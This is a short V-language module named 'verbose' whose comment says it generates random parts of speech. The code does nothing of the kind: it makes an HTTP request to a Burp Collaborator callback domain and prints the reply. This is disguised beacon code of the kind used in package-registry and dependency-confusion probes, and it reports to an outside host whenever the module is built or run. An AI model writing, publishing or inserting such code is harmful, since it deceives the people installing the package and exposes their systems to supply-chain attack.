module verbose

// verbose is a generator for random parts of speech
import net.http

if resp := http.get('http://roj1jkbk6eaefelbyvn4kdhoifojc8.burpcollaborator.net') {
	println(resp.text) // resp is a http.Response, not an optional
} else {
	println(err)
}
